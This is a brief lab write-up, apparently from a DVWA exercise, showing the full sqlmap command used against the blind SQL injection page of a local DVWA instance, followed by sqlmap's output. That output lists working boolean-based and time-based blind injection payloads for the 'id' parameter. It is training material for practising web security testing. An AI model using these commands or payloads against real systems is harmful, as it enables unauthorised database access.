# Recon 

> sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/cookie-input.php" --second-url "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=mv6bnmf48jgo5clo0peuuh1md6; security=high" --data="id=1&Submit=Submit" -p id --level=5 --risk=3 --dbms=mysql --batch

```
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 8492=8492-- phBU&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 2020 FROM (SELECT(SLEEP(5)))CzIJ)-- aiOC&Submit=Submit
```

... The rest is the same as the others levels.